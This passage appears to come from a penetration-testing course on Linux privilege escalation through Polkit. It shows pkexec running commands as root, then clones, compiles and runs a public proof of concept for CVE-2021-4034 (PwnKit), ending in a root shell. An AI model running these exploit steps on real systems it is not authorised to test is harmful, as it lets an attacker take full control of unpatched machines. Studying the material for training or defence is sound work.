Polkit works with two groups of files.

1. actions/policies (`/usr/share/polkit-1/actions`)
2. rules (`/usr/share/polkit-1/rules.d`)

The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.

```shell
cry0l1t3@nix02:~$ # pkexec -u <user> <command> 
cry0l1t3@nix02:~$ pkexec -u root id 

uid=0(root) gid=0(root) groups=0(root)
```

```shell
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

```shell
cry0l1t3@nix02:~$ ./poc 

# id 

uid=0(root) gid=0(root) groups=0(root)
```
